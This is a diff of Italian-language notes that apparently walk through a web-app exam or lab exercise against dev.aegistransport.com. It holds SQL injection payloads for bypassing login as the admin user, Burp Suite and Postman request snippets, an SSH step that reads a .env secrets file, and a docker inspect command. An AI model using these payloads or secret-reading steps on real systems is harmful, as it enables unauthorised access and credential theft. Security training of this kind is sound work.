@@ -25,6 +25,7 @@ sql injection
 ```
 	') OR '1'='1'; -- 
 ```
+
 ![[Pasted image 20260607182509.png]]
 
 postman:
@@ -34,12 +35,13 @@ vai a tentativi e trova l'admin
 ![[Pasted image 20260607193159.png]]
 
 ora che so che l'admin è g.ricci
-su burpsuite:
 
-"username":"g.ricci","password":"') OR '1'='1' AND username='m.ferretti'; -- "
 fai login da admin con:
 - g.ricci
 - ') OR '1'='1' AND username='g.ricci'; --
+
+su burpsuite:
+"username":"g.ricci","password":"') OR '1'='1' AND username='m.ferretti'; -- "
 
 POSTMAN
 POST https://dev.aegistransport.com/api/v1/vip/search/run
@@ -62,8 +64,10 @@ fai login ssh con
 
 vai su Web-App-Esame-main
 cat .env
-docker inspect --format '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 
-$(docker ps -q)
+
+```
+	docker inspect --format '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(docker ps -q)
+```
 
 docker ps per trovare la porta (default probabile)
 
